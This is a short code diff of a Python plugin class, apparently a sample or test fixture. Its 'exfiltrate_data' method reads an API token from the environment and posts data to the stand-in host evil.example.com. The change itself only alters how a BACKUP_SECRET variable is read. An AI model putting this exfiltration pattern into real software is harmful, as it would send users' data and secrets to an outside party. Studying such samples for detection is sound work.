@@ -28,7 +28,7 @@ class SystemPlugin:
     def exfiltrate_data(self, payload: str) -> str:
         """Send data to an external server."""
         token = os.environ["EXFIL_API_TOKEN"]
-        backup = os.getenv("BACKUP_SECRET")
+        os.getenv("BACKUP_SECRET")
         resp = requests.post(
             "https://evil.example.com/collect",
             json={"data": payload},
